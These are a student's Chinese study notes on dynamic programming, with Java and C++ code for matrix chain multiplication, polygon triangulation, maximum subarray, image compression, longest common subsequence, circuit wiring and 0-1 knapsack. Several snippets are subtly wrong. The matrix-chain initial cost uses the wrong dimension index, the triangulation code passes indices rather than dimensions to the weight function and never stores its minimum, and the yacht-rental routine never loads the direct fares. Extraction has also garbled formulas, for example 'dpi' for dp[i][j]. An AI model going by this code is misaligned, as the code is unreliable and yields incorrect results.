​\t算法MatrixChain的主要计算量取决于算法中对r，i和k的3重循环。循环体内的计算量为𝑂(1)，而3重循环的总次数为𝑂(𝑛3)。因此算法的计算时间上界为𝑂(𝑛3)。算法所占用的空间显然为𝑂(𝑛2)。\ntraceback递归地来构造答案，那么完整可运行的代码如下：\npackage Dynamic; public class demo01 { public static void matrixChain(int[] p, int[][] dp, int[][] partitionIndex){ //有n个矩阵 int n = p.length - 1; //初始化为0 for(int index = 0; index \u0026lt; n; ++index){ dp[index][index] = 0; } //控制矩阵链的长度 for(int len = 2; len \u0026lt;= n; ++len){ for(int i = 1; i \u0026lt;= n - len + 1; ++i){ //以第一个为基础 int j = i + len - 1; dp[i][j] = dp[i + 1][j] + p[i + 1] * p[i] * p[j]; partitionIndex[i][j] = i; for(int k = i + 1; k \u0026lt; j; ++k){ int value = dp[i][k] + p[i - 1] * p[k] * p[j] + dp[k + 1][j]; if(value \u0026lt; dp[i][j]){ dp[i][j] = value; partitionIndex[i][j] = k; } } } } } public static void traceBack(int left, int right, int[][] partitionIndex){ if(left == right){ System.out.printf(\u0026#34;A\u0026#34; + left); }else{ System.out.print(\u0026#34;(\u0026#34;); traceBack(left, partitionIndex[left][right], partitionIndex); traceBack(partitionIndex[left][right] + 1, right, partitionIndex); System.out.print(\u0026#34;)\u0026#34;); } } public static void main(String[] args) { int[] p = {30, 35, 15, 5, 10, 20, 25}; int n = 6; int[][] m = new int[7][7]; int[][] s = new int[7][7]; matrixChain(p, m, s); traceBack(1, 6, s); System.out.println(); System.out.println(m[1][6]); } } 3）备忘录方法 # memo (python:@cache)\n​\t备忘录方法的控制结构与直接递归方法的控制结构相同，区别在于备忘录方法为每个解过的子问题建立了备忘录以备需要时查看，避免了相同子问题的重复求解。\n​\t备忘录方法的递归方式是自顶向下的，而动态规划算法则是自底向上递归的。\n​\t用递归解决问题的期间把值记录起来。\n以下是代码：\npackage Dynamic; public class demo02 { public static int lookUpChain(int left, int right, int[] p, int[][] m, int[][] partitionIndex){ if(m[left][right] \u0026gt; 0){ return m[left][right]; } if(left == right){ return 0; } int min = lookUpChain(left, left, p, m, partitionIndex) + lookUpChain(left + 1, right, p, m, partitionIndex) + p[left - 1] * p[left] * p[right]; partitionIndex[left][right] = left; for(int index = left + 1; index \u0026lt;= right; ++index){ int curr = lookUpChain(left, index, p, m, partitionIndex) + lookUpChain(index + 1, right, p, m, partitionIndex) + p[left - 1] * p[index] * p[right]; if(curr \u0026lt; min){ min = curr; partitionIndex[left][right] = index; } } m[left][right] = min; return min; } } 2.凸多边形最优三角剖分 # 用多边形顶点的逆时针序列表示凸多边形，即P={v0,v1,…,vn-1}表示具有n条边的凸多边形。\n若vi与vj是多边形上不相邻的2个顶点，则线段vivj称为多边形的一条弦。弦将多边形分割成2个多边形{vi,vi+1,…,vj}和{vj,vj+1,…,vi}。\n多边形的三角剖分是将多边形分割成互不相交的三角形的弦的集合T。\n注意：T中各弦互不相交，且集合T已达到最大；有n个顶点的凸多边形的三角剖分中，恰有n-3条弦和n-2个三角形。\n题目描述：给定凸多边形P，以及定义在由多边形的边和弦组成的三角形上的权函数w。要求确定该凸多边形的三角剖分，使得该三角剖分中诸三角形上权之和为最小。\n① 三角剖分的结构 # ​\t一个表达式的完全加括号方式相应于一棵完全二叉树，称为表达式的语法树。例如，完全加括号的矩阵连乘积((A1(A2A3))(A4(A5A6)))所相应的语法树如图 (a)所示。凸多边形{v0,v1,…vn-1}的三角剖分也可以用语法树表示。例如，图 (b)中凸多边形的三角剖分可用图 (a)所示的语法树表示。\n​\t矩阵连乘积中的每个矩阵Ai对应于凸(n+1)边形中的一条边𝑣𝑖−1𝑣𝑖。三角剖分中的一条弦𝑣𝑖𝑣𝑗，i\u0026lt;j，对应于矩阵连乘积A[i+1:j]。\n​\t给定矩阵链𝐴1𝐴2𝐴3𝐴4𝐴5𝐴6，Ai的维数为𝑝𝑖−1×𝑝𝑖；定义凸多边形P={𝑣0,𝑣1,𝑣2,𝑣3,𝑣4,𝑣5,𝑣6}，其三角形𝑣𝑖𝑣𝑗𝑣𝑘上的权函数值为𝑤(𝑣𝑖𝑣𝑗𝑣𝑘)=𝑝𝑖𝑝𝑗𝑝𝑘，依此定义，P的最优三角剖分所对应的语法树给出了矩阵链的最优完全加括号方式。\n② 最优子结构性质 # ​\t凸多边形的最优三角剖分问题有最优子结构性质。\n证明的时候就要使用反证法。\n​\t事实上，若凸(n+1)边形P={v0,v1,…,vn-1}的最优三角剖分T包含三角形v0vkvn，1≤k≤n-1，则T的权为3个部分权的和：三角形v0vkvn的权，子多边形{v0,v1,…,vk}和{vk,vk+1,…,vn}的权之和。可以断言，由T所确定的这2个子多边形的三角剖分也是最优的。因为若有{v0,v1,…,vk}或{vk,vk+1,…,vn}的更小权的三角剖分将导致T不是最优三角剖分的矛盾。\n③ 最优三角形剖分的递归结构 # 注意定义的时候前面有一个-1,所以最优方案也是从1开始为t1n\n​\t定义𝑡[𝑖][𝑗]，1≤i\u0026lt;j≤n为凸子多边形{vi-1, vi,…,vj}的最优三角剖分所对应的权函数值，即其最优值。为方便起见，设退化的多边形{vi-1,vi}具有权值0。据此定义，要计算的凸(n+1)边形P的最优权值为𝑡[1][𝑛]。\nt [ i ] [ j ] 的值可以利用最优子结构性质递归地计算。当j-i≥1时，凸子多边形至少有3个顶点。由最优子结构性质，**$t[i][j]$**的值应为$t[i][k]$的值加上$t[k+1][j]$的值，再加上三角形$v_{i-1}v_kv_j$的权值，其中i≤k≤j-1。由于在计算时还不知道k的确切位置，而k的所有可能位置只有j-i个，因此可以在这j-i个位置中选出使值$t[i][j]$达到最小的位置。由此，$t[i][j]$可递归地定义为 那么代码如下，和矩阵乘法是类似的处理方式：\npackage Dynamic; public class demo03 { public static int w(int a, int b, int c){ return a * b * c; } public static void minWeightTriangulation(int[] p, int[][] dp, int n, int[][] partitionIndex){ //initialize for(int index = 1; index \u0026lt;= n; ++index){ dp[index][index] = 0; } for(int r = 2; r \u0026lt;= n; ++r){ for(int i = 1; i \u0026lt;= n - r + 1; ++i){ int j = i + r - 1; int minValue = dp[i + 1][j] + w(i - 1, i, j); partitionIndex[i][j] = i; for(int k = i + 1; k \u0026lt; i + r - 1; ++k){ int currValue = dp[i][k] + w(i - 1, j, k) + dp[k + 1][j]; if(currValue \u0026lt; minValue){ minValue = currValue; partitionIndex[i][j] = k; } } } } } } 3.多边形游戏 # ​\t多边形游戏是一个单人玩的游戏，开始时有一个由n个顶点构成的多边形。每个顶点被赋予一个整数值，每条边被赋予一个运算符“+”或“*”。所有边依次用整数从1到n编号。\n1️⃣ 游戏第1步，将一条边删除。\n2️⃣ 随后n-1步按以下方式操作：\n(1)选择一条边E以及由E连接着的2个顶点V1和V2；\n(2)用一个新的顶点取代边E以及由E连接着的2个顶点V1和V2。将由顶点V1和V2的整数值通过边E上的运算得到的结果赋予新顶点。\n3️⃣ 最后，所有边都被删除，游戏结束。游戏的得分就是所剩顶点上的整数值。\n先只作证明，具体可以看书。\n4.公园游艇问题(考试难度类似) # ​\t题目描述：长江游艇俱乐部在长江上设置了n 个游艇出租站{1,2,…,n}。游客可在这些游艇出租站租用游艇，并在下游的任何一个游艇出租站归还游艇。游艇出租站 i 到游艇出租站 j 之间的租金为r(i,j),1≤i\u0026lt;j≤n。试设计一个算法，计算出从游艇出租站 1 到游艇出租站 n 所需的最少租金。\n思考一下，还是和矩阵连乘的问题是类似的。\n1️⃣ 最优解结构\n​\tr(i,j)表示游艇出租站i直接到j之间的租金，m(i,j)表示从出租站i出发，到达第j站需要的租金 例如m(1,3)就表示从第1站出发，到达第3站所需的租金，而m(1,3)可以有多种租用方案，例如可以1-2.2-3与1-3。\n假设在第k站换游艇( i ≤ k ≤ j ) ,则有m(i,j)=m(i,k)+m(k,j)，其中m(i,j)的最优解包括m(i,k)与m(k,j)的最优解。\n2️⃣ 建立递归关系\n由以上分析可知，显然有：\n3️⃣ 计算最优值\nvoid cent(int[][] m, int n, int[][] s) { for (int i = 1; i \u0026lt;=n ; i++) { m[i][i]=0; } for (int r = 2; r \u0026lt;= n; r++) for (int i = 1; i \u0026lt;= n - r + 1; i++) { int j = i + r - 1; s[i][j] = i; for (int k = i; k \u0026lt;= j; k++) { int temp = m[i][k] + m[k][j]; if (temp \u0026lt; m[i][j]) { m[i][j] = temp; s[i][j] = k;//在第k站下 } } } } 构造最优解：\nvoid traceBack(int i, int j, int[][] s) { if (i == j) { System.out.print(i); return; } System.out.print(\u0026#34;[\u0026#34;); traceBack(i, s[i][j], s); traceBack(s[i][j] + 1, j, s); System.out.print(\u0026#34;]\u0026#34;); } 5.最大子段和 # 和最大的一个连续子数组。\n​\tLeetCode：https://leetcode.cn/problems/maximum-subarray/description/\n​\t题目描述：给定由n个整数（可能为负整数）组成的序列a1,a2,…,an，求该序列子段和的最大值。当所有整数均为负整数时定义其最大子段和为0。依此定义，所求的最优值为： 例，序列{-2,11,-4,13,-5,-2}的最大子段和为20。\n​\t做法：定义状态 f[i] 表示以 a[i] 结尾的最大子数组和，不和 i 左边拼起来就是 f[i]=a[i]，和 i 左边拼起来就是 f[i]=f[i−1]+a[i]，取最大值就得到了状态转移方程 f[i]=max(f[i−1],0)+a[i]，答案为 max(f)。这个做法也叫做 Kadane 算法。\n由b[j]的定义易知，当b[j-1]\u0026gt;0时，b[j]=b[j-1]+a[j]，否则b[j]=a[j]，故 代码如下：\nclass Solution { public int maxSubArray(int[] nums) { int ans = nums[0]; int n = nums.length; int[] dp = new int[n]; dp[0] = nums[0]; for(int index = 1; index \u0026lt; n; ++index){ if(dp[index - 1] \u0026lt; 0){ dp[index] = nums[index]; }else{ dp[index] = dp[index - 1] + nums[index]; } ans = Math.max(ans, dp[index]); } return ans; } } 最大子段和问题与动态规划算法的推广 # 1、最大子矩阵和问题 # 给定一个m行n列的整数矩阵A，试求矩阵A的一个子矩阵，使其各元素之和为最大。\n把每两行之间的数字相加起来，使之成为一个一维的数组，接着用上面的方法来处理即可，这个问题比较简单。\n/** * 最大子矩阵和 * @param m * @param n * @param a * @return */ public static int MaxSum2(int m,int n,int[][]a){ int sum=0; int[]b=new int[n]; for(int i=0;i\u0026lt;m;i++){ //从第i行 for(int k=0;k\u0026lt;n;k++) //初始化数组b b[k]=0; for(int j=i;j\u0026lt;m;j++){ //到第j行 for(int k=0;k\u0026lt;n;k++) b[k]+=a[j][k];//按列取值 int max=solveByDP(b); if(max\u0026gt;sum) sum=max; } } return sum; } 2.*最大M子段和问题 # ​\t定由n个整数（可能为负数）组成的序列{a1,a2,…,an}，以及一个正整数m，要求确定序列{a1,a2,…,an}的m个不相交子段，使这m个子段的总和达到最大。\n设b(i,j)表示数组a的前j项中i个子段和的最大值，且第i个子段含a[j]（1≤i ≤ m，i ≤j ≤n），则计算b(i,j)的递归式为\n初始时\nb(0,j)=0, (1≤j ≤n)\nb(i,0)=0, (1≤i ≤m)\nint MaxSum(int m,int n,int *a) { if(n\u0026lt;m||m\u0026lt;1) return 0; int **b=new int *[m+1]; //定义二维数组b for(int i=0; i\u0026lt;=m; i++) b[i]=new int[n+1]; for(int i=0; i\u0026lt;=m; i++) //初始值 b[i][0]=0; for(int j=1; j\u0026lt;=n; j++) b[0][j]=0; for(int i=1; i\u0026lt;=m; i++) //1≤i ≤m for(int j=i; j\u0026lt;n-m+i; j++) //j≥i, t\u0026lt;j if(j\u0026gt;i) { b[i][j]=b[i][j-1]+a[j]; for(int k=i-1; k\u0026lt;j; k++) //i-1≤t\u0026lt;j if(b[i][j]\u0026lt;b[i-1][k]+a[j]) b[i][j]=b[i-1][k]+a[j]; } else //j=i, 每个数都是一个子段 b[i][j]=b[i-1][j-1]+a[j]; int sum=0; for(int j=m; j\u0026lt;=n; j++) if(sum\u0026lt;b[m][j]) sum=b[m][j]; return sum; } 6.*图像压缩问题（没看懂） # 我没看懂在干嘛，先放着吧。\n​\t计算机中常用像素点灰度值序列{𝑝1,𝑝2,\u0026hellip;,𝑝𝑛}表示图像，𝑝𝑖表示像素点i的灰度值。灰度值的范围常为0~255，需要用8位来表示。\n​\t图像的变位压缩存储格式将所给的像素点序列{𝑝1,𝑝2,\u0026hellip;,𝑝𝑛}分割成m个连续段{𝑆1,𝑆2,\u0026hellip;,𝑆𝑚}。第i个像素段Si中有l[i]个像素，且该段中每个像素都只用b[i]位表示。需用3位表示b[i]，如果限制1≤l[i]≤255，则需要用8位表示l[i]，因此第i个像素段所需的存储空间为l[i]*b[i]+11。——即一段中最多有255个像素，用8位二进制表示\n整个像素序列的存储空间为\n问题描述：确定像素序列{p1,p2,\u0026hellip;,pn}的一个最优分段，使得依此分段所需的存储空间最小。其中0≤pi ≤255，1 ≤i ≤n，每个分段的长度不超过255位。\n1️⃣ 最优子结构 # 设l[i],b[i]，1≤i ≤m是{𝑝1,𝑝2,…,𝑝𝑛}的最优分段。显而易见，l[1],b[1]是{𝑝1,𝑝2,…,𝑝𝑙[1]}的最优分段，且l[i],b[i]， 2≤i ≤m是\n{𝑝𝑙[1]+1,…,𝑝𝑛}的最优分段。即图象压缩问题满足最优子结构性质。\n2️⃣ 递归计算最优值 # 设s[i]，1≤i≤n，是像素序列{𝑝1,𝑝2,…,𝑝𝑖}的最优分段所需的存储位数。由最优子结构性质易知：\n举例：\n3️⃣ 构造最优解 # 算法用l[i],b[i]记录了最优分段所需的信息。\n最优分段的最后一段的段长和像素位数分别存储于l[n]和b[n]中，其前一段的段长度和像素位数存储于l[n-l[n]]和b[n-l[n]]中。依此类推，可在O(n)时间内构造出相应的最优解\n/** * 计算十进制数i所需的二进制位数 * * @param i * @return */ static int length(int i) { int k = 1; i = i / 2; while (i \u0026gt; 0) { k++; i = i / 2; } return k; } /** * @param n * @param l [p1:pi]的最优分段中最后1个分段的像素个数 * @param p p[p1:pn]，像素点灰度值序列 * @param s 像素序列[p1:pi]的最优分段所需的存储位数 * @param b 像素p[i]所需的存储位数 */ public static void Compress(int n, int[] p, int[] s, int[] l, int[] b) { int Lmax = 255;//每个分段的长度不超过255位 int header = 11;//分段段头所需的位数,表示一个段的附加信息 s[0] = 0; for (int i = 1; i \u0026lt;= n; i++) //[p1:pi] { b[i] = length(p[i]); int bmax = b[i]; s[i] = s[i - 1] + bmax; //k=1 l[i] = 1; for (int j = 2; j \u0026lt;= i \u0026amp;\u0026amp; j \u0026lt;= Lmax; j++) //最后的1个分段中有j个像素 { if (bmax \u0026lt; b[i - j + 1]) bmax = b[i - j + 1];//这一段中的最大位数 if (s[i] \u0026gt; s[i - j] + j * bmax) {//找到更好的分段 s[i] = s[i - j] + j * bmax; l[i] = j; } } s[i] += header;//加上额外开销 } } public static int Traceback(int n, int i, int[] s, int[] l) { if (n == 0) return i; i = Traceback(n - l[n], i, s, l); s[i++] = n - l[n];// 重新为s[]数组赋值，用来存储分段位置 return i; } static void Output(int s[], int l[], int b[], int n) { System.out.println(\u0026#34;The optimal value is \u0026#34; + s[n]); int m = 0; m=Traceback(n, m, s, l); //m:分段数 s[m] = n; //m个分段像素的累积和，Traceback算到m-1个 System.out.println(\u0026#34;Decompose into \u0026#34; + m + \u0026#34; segments\u0026#34;); for (int j = 1; j \u0026lt;= m; j++) { l[j] = l[s[j]]; //计算第j个分段像素个数: l[j] b[j] = b[s[j]]; //计算第j个分段所需的存储位数: b[j] } for (int j = 1; j \u0026lt;= m; j++) System.out.println(l[j] + \u0026#34; \u0026#34; + b[j]); } public static void main(String[] args) { int p[] = {0,10,12,15,255,2,1};//第一位不算 int N=p.length; int s[] = new int[N]; int l[] = new int[N]; int b[] = new int[N]; Compress(N-1, p, s, l, b); Output(s, l, b, N-1); } } 7.*最长公共子序列 # LeetCode:https://leetcode.cn/problems/longest-common-subsequence/description/\n​\t若给定序列𝑋=𝑥1,𝑥2,…,𝑥𝑚，则另一序列𝑍=𝑧1,𝑧2,…,𝑧𝑘，是X的子序列是指存在一个严格递增下标序列𝑖1,𝑖2,…,𝑖𝑘使得对于所有j=1,2,…,k有：𝑧𝑗=𝑥𝑖𝑗。例如，序列Z={B, C, D, B}是序列X={A, B, C , B, D, A, B}的子序列，相应的递增下标序列为{2, 3, 5, 7}。给定2个序列X和Y，当另一序列Z既是X的子序列又是Y的子序列时，称Z是序列X和Y的公共子序列。例：X={A,B,C,B,D,A,B}，Y={B,D,C,A,B,A}，则序列{B,C,A}是X和Y的一个公共子序列。\n1）最长公共子序列的结构 # 设序列X={x1,x2,…,xm}和Y={y1,y2,…,yn}的最长公共子序列为Z={z1,z2,…,zk} ，则\n⑴若xm=yn，则zk=xm=yn，且Zk-1是Xm-1和Yn-1的最长公共子序列。\n⑵若xm≠yn且zk≠xm，则Z是Xm-1和Y的最长公共子序列。\n⑶若xm≠yn且zk≠yn，则Z是X和Yn-1的最长公共子序列。\n由此可见，2个序列的最长公共子序列包含了这2个序列的前缀的最长公共子序列。因此，最长公共子序列问题具有最优子结构性质。\n2）子问题的递归结构 # 由最长公共子序列问题的最优子结构性质建立子问题最优值的递归关系。用𝑐[𝑖][𝑗]记录序列的最长公共子序列的长度。其中，\nX i = x 1 , x 2 , … , x i ； Y j = y 1 , y 2 , … , y j 。当i=0或j=0时，空序列是Xi和Yj的最长公共子序列。故此时𝐶[𝑖][𝑗]=0。其它情况下，由最优子结构性质可建立递归关系如下：\n3）计算最优值 # 由于在所考虑的子问题空间中，总共有θ(mn)个不同的子问题，因此，用动态规划算法自底向上地计算最优值能提高算法的效率。\n输入：x,y （序列数组）\n输出：\nc [ i ] [ j ] ，存储x[1:i]和y[1:j]的最长公共子序列的长度；\nb [ i ] [ j ] ，记录上面𝑐[𝑖][𝑗]的值是由哪个子问题的解得到的。\n/** * 计算最长公共子序列 * @param x 序列数组 * @param y 序列数组 * @param c 存储x[1:i]和y[1:j]的最长公共子序列的长度 * @param b 记录上面c[i][j]的值是由哪个子问题的解得到的 */ public static void LCSLength(char[] x, char[] y, int[][] c, int[][] b) { int m = x.length-1; int n = y.length-1; for (int i = 1; i \u0026lt;= m; i++) { c[i][0] = 0; } for (int i = 1; i \u0026lt;= n; i++) { c[0][i] = 0; }//第一个条件 for (int i = 1; i \u0026lt;= m; i++) { for (int j = 1; j \u0026lt;= n; j++) { if (x[i] == y[j]) { c[i][j] = c[i - 1][j - 1] + 1; b[i][j] = 1; //表示Xi和Yi的最长公共子序列是由Xi-1和Yi-1的最长公共子序列在尾部加上xi所得到的。 } else if (c[i - 1][j] \u0026gt;= c[i][j - 1]) { c[i][j] = c[i - 1][j]; b[i][j] = 2; //表示Xi和Yi的最长公共子序列与Xi-1和Yi的最长公共子序列相同 } else { c[i][j] = c[i][j - 1]; b[i][j] = 3; //表示Xi和Yi的最长公共子序列与Xi和Yj-1的最长公共子序列相同 } } } } 算法耗时O(mn)\n4）构造最长公共子序列 # 从𝑏[𝑚][𝑛] 开始，依其值在数组b中搜索。\nb [ i ] [ j ] 的值为：\n1，表示Xi和Yi的最长公共子序列是由Xi-1和Yi-1的最长公共子序列在尾部加上xi所得到的。\n2，表示Xi和Yi的最长公共子序列与Xi-1和Yi的最长公共子序列相同。\n3， 表示Xi和Yi的最长公共子序列与Xi和Yi-1的最长公共子序列相同。\npublic static void LCS(int m, int n, char[] x, int[][] b) { if (m == 0 || n == 0) { return; } if (b[m][n] == 1) { LCS(m - 1, n - 1, x, b); System.out.print(x[m]); } else if (b[m][n] == 2) { LCS(m - 1, n, x, b); } else { LCS(m, n - 1, x, b); } } 5）算法的改进 # ​\t在算法lcsLength和lcs中，可进一步将数组b省去。事实上，数组元素𝑐[𝑖][𝑗]的值仅由，和𝑐[𝑖−1][𝑗−1]，𝑐[𝑖−1][𝑗]和𝑐[𝑖][𝑗−1]这3个数组元素的值所确定。对于给定的数组元素𝑐[𝑖][𝑗]，可以不借助于数组b而仅借助于c本身在O(1)时间内确定𝑐[𝑖][𝑗]的值是由，和𝑐[𝑖−1][𝑗−1]，𝑐[𝑖−1][𝑗]和𝑐[𝑖][𝑗−1]中哪一个值所确定的。\n​\t如果只需要计算最长公共子序列的长度，则算法的空间需求可大大减少。事实上，在计算𝑐[𝑖][𝑗]时，只用到数组c的第i行和第i-1行。因此，用2行的数组空间就可以计算出最长公共子序列的长度。进一步的分析还可将空间需求减至O(min(m,n))。\n8.电路布线问题 # LeetCode类似问题：https://leetcode.cn/problems/uncrossed-lines/description/\nLCS的变种。\n​\t在一块电路板的上、下2端分别有n个接线柱。根据电路设计，要求用导线(i,π(i))将上端接线柱与下端接线柱相连，其中π(i)是{1,2,…,n}的一个排列。导线(i,π(i))称为该电路板上的第i条连线。对于任何1≤i\u0026lt;j≤n，第i条连线和第j条连线相交的充分且必要的条件是π(i)\u0026gt;π(j)。\n​\t电路布线问题要确定将哪些连线安排在第一层上，使得该层上有尽可能多的连线。换句话说，该问题要求确定导线集Nets={(i,π(i)),1≤i≤n}的最大不相交子集。\n最优子结构性质 # 看清楚这里N(i,j)的实际含义。t \u0026lt;= i\u0026hellip;\u0026hellip;\n考试前再看一下，比较有意思。\n代码：\nvoid MNS(int C[],int n,int **size){ //C[i]，即π[i] //size[i][j]，N(i,j)的最大不相交子集中连线的数目 for(int j=0; j\u0026lt;C[1]; j++) //i=1，j\u0026lt;π(1) size[1][j]=0; for(int j=C[1]; j\u0026lt;=n; j++) //i=1，j\u0026gt;=π(1) size[1][j]=1; for(int i=2; i\u0026lt;n; i++) //1\u0026lt;i\u0026lt;n { for(int j=0; j\u0026lt;C[i]; j++) //j\u0026lt;π(i) size[i][j]=size[i-1][j]; for(int j=C[i]; j\u0026lt;=n; j++) //j\u0026gt;=π(i) size[i][j]=max(size[i-1][j],size[i-1][C[i]-1]+1); } size[n][n]=max(size[n-1][n],size[n-1][C[n]-1]+1); //i=n,j=n } void Traceback(int C[],int **size,int n,int Net[],int \u0026amp;m) { //Net[0:m-1]存储MNS(n,n)中的m条连线 int j=n; m=0; for(int i=n; i\u0026gt;1; i--) if(size[i][j]!=size[i-1][j]) //第i条连线∈MNS(n,n) { Net[m++]=i; j=C[i]-1; //π[i] } if(j\u0026gt;=C[1]) //i=1 Net[m++]=1; } 9.01背包问题（重要） # 可以看代码随想录，我不知道为什么课本能写的这么逆天。\n但是要理解书上的关于跳跃点的问题。\nhttps://programmercarl.com/%E8%83%8C%E5%8C%85%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%8001%E8%83%8C%E5%8C%85-2.html#%E7%AE%97%E6%B3%95%E5%85%AC%E5%BC%80%E8%AF%BE\n重要：背下来\n给定n种物品和一背包。物品i的重量是𝑤𝑖，其价值为𝑣𝑖，背包的容量为C。问应如何选择装入背包的物品，使得装入背包中物品的总价值最大?\n0-1背包问题是一个特殊的整数规划问题\n1️⃣ 最优子结构性质（证明题） # 注意证明的方法和思想。\n设(y1,y2,\u0026hellip;,yn)是所给问题的一个最优解，则(y2,y3,\u0026hellip;,yn)是下面相应子问题的的一个最优解：\n若不然，设(z2,z3,\u0026hellip;,zn)是上述子问题的一个最优解。\n这说明(y1,z2,\u0026hellip;,zn)是所给问题的一个更优解，从而与(y1,y2,\u0026hellip;,yn)是所给问题的最优解相矛盾。\n在这里反推矛盾，书上这里还写错了，纯垃圾书!\n2️⃣ 递归关系 # 设所给0-1背包问题的子问题的最优值为m(i,j)，即m(i,j)是背包容量为j，可选择物品为i,i+1,…,n时0-1背包问题的最优值。 由0-1背包问题的最优子结构性质，可以建立计算m(i,j)的递归式如下。\n3️⃣ 算法描述 # public class KnapsackProblem { //0-1背包问题 /** * * @param v v[1:n]，物品i的价值 * @param w w[1:n]，物品i的重量 * @param c 背包容量 * @param n * @param m m[i][j]，背包容量为j，可选物品为[i:n]时，0-1背包问题的最优值 */ public static void Knapsack(int[]v,int[]w,int c,int n,int[][]m){ int jMax = Math.min(w[n]-1,c); for (int j = 0; j \u0026lt;=jMax; j++) { m[n][j]=0;//j\u0026lt;=c\u0026amp;\u0026amp;j\u0026lt;w[n]，物品n无法放入背包 } for (int j = w[n]; j \u0026lt;=c; j++) { m[n][j]=v[n];//w[n]\u0026lt;=j\u0026lt;=c，物品n可以放入背包 }//画边界，从后往前看 for (int i = n-1; i \u0026gt;1 ; i--) { jMax = Math.min(w[i]-1,c); for (int j = 0; j \u0026lt;=jMax; j++) { m[i][j]=m[i+1][j];//物品i无法放入背包 } for (int j = w[i]; j \u0026lt;=c ; j++) {//物品i可放入背包 m[i][j]=Math.max(m[i+1][j],m[i+1][j-w[i]]+v[i]); } } m[1][c]=m[2][c]; if (c\u0026gt;=w[1]){ m[1][c]=Math.max(m[1][c],m[2][c-w[1]]+v[1]); } } /** * 求解 * @param m * @param w * @param c * @param n * @param x 具体的解 */ public static void TraceBack(int[][]m, int[]w,int c,int n,int[]x){ for(int i=1;i\u0026lt;n;i++) if(m[i][c]==m[i+1][c]) x[i]=0; else { x[i]=1; c-=w[i]; } x[n]=(m[n][c]\u0026gt;0)?1:0; } public static void main(String[] args) { int[]v={0,1,13,8,4,5,6,7}; int[]w={0,2,3,1,4,1,5,1}; int c = 10; int n = v.length; int[] x = new int[n]; int[][]m=new int[n][c+1]; Knapsack(v,w,c,n-1,m); TraceBack(m,w,c,n-1,x); for (int i = 1; i \u0026lt; n; i++) { System.out.println(x[i]+\u0026#34; \u0026#34;); } } } 一维的优化问题：\n以下从代码随想录的网站上复制的\n一维dp数组（滚动数组） # 对于背包问题其实状态都是可以压缩的。\n在使用二维数组的时候，递推公式：dpi = max(dpi - 1, dpi - 1] + value[i]);\n其实可以发现如果把dp[i - 1]那一层拷贝到dp[i]上，表达式完全可以是：dpi = max(dpi, dpi] + value[i]);\n与其把dp[i - 1]这一层拷贝到dp[i]上，不如只用一个一维数组了，只用dp[j]（一维数组，也可以理解是一个滚动数组）。\n这就是滚动数组的由来，需要满足的条件是上一层可以重复利用，直接拷贝到当前层。\n读到这里估计大家都忘了 dpi里的i和j表达的是什么了，i是物品，j是背包容量。\ndpi 表示从下标为[0-i]的物品里任意取，放进容量为j的背包，价值总和最大是多少。\n一定要时刻记住这里i和j的含义，要不然很容易看懵了。\n动规五部曲分析如下：\n确定dp数组的定义 关于dp数组的定义，我在 01背包理论基础\n(opens new window) 有详细讲解\n在一维dp数组中，dp[j]表示：容量为j的背包，所背的物品价值可以最大为dp[j]。\n一维dp数组的递推公式 二维dp数组的递推公式为： dp[i][j] = max(dp[i - 1][j], dp[i - 1][j - weight[i]] + value[i]);\n公式是怎么来的 在这里 01背包理论基础\n(opens new window) 有详细讲解。\n一维dp数组，其实就上上一层 dp[i-1] 这一层 拷贝的 dp[i]来。\n所以在 上面递推公式的基础上，去掉i这个维度就好。\n递推公式为：dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);\n以下为分析：\ndp[j]为 容量为j的背包所背的最大价值。\ndp[j]可以通过dp[j - weight[i]]推导出来，dp[j - weight[i]]表示容量为j - weight[i]的背包所背的最大价值。\ndp[j - weight[i]] + value[i] 表示 容量为 [j - 物品i重量] 的背包 加上 物品i的价值。（也就是容量为j的背包，放入物品i了之后的价值即：dp[j]）\n此时dp[j]有两个选择，一个是取自己dp[j] 相当于 二维dp数组中的dpi-1，即不放物品i，一个是取dp[j - weight[i]] + value[i]，即放物品i，指定是取最大的，毕竟是求最大价值，\n所以递归公式为：\ndp[j] = max(dp[j], dp[j - weight[i]] + value[i]); 可以看出相对于二维dp数组的写法，就是把dpi中i的维度去掉了。\n一维dp数组如何初始化 关于初始化，一定要和dp数组的定义吻合，否则到递推公式的时候就会越来越乱。\ndp[j]表示：容量为j的背包，所背的物品价值可以最大为dp[j]，那么dp[0]就应该是0，因为背包容量为0所背的物品的最大价值就是0。\n那么dp数组除了下标0的位置，初始为0，其他下标应该初始化多少呢？\n看一下递归公式：dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);\ndp数组在推导的时候一定是取价值最大的数，如果题目给的价值都是正整数那么非0下标都初始化为0就可以了。\n这样才能让dp数组在递归公式的过程中取的最大的价值，而不是被初始值覆盖了。\n那么我假设物品价值都是大于0的，所以dp数组初始化的时候，都初始为0就可以了。\n一维dp数组遍历顺序 代码如下：\nfor(int i = 0; i \u0026lt; weight.size(); i++) { // 遍历物品 for(int j = bagWeight; j \u0026gt;= weight[i]; j--) { // 遍历背包容量 dp[j] = max(dp[j], dp[j - weight[i]] + value[i]); } } 这里大家发现和二维dp的写法中，遍历背包的顺序是不一样的！\n二维dp遍历的时候，背包容量是从小到大，而一维dp遍历的时候，背包是从大到小。\n为什么呢？\n倒序遍历是为了保证物品i只被放入一次！。但如果一旦正序遍历了，那么物品0就会被重复加入多次！\n举一个例子：物品0的重量weight[0] = 1，价值value[0] = 15\n如果正序遍历\ndp[1] = dp[1 - weight[0]] + value[0] = 15\ndp[2] = dp[2 - weight[0]] + value[0] = 30\n此时dp[2]就已经是30了，意味着物品0，被放入了两次，所以不能正序遍历。\n为什么倒序遍历，就可以保证物品只放入一次呢？\n倒序就是先算dp[2]\ndp[2] = dp[2 - weight[0]] + value[0] = 15 （dp数组已经都初始化为0）\ndp[1] = dp[1 - weight[0]] + value[0] = 15\n所以从后往前循环，每次取得状态不会和之前取得状态重合，这样每种物品就只取一次了。\n那么问题又来了，为什么二维dp数组遍历的时候不用倒序呢？\n因为对于二维dp，dpi都是通过上一层即dpi - 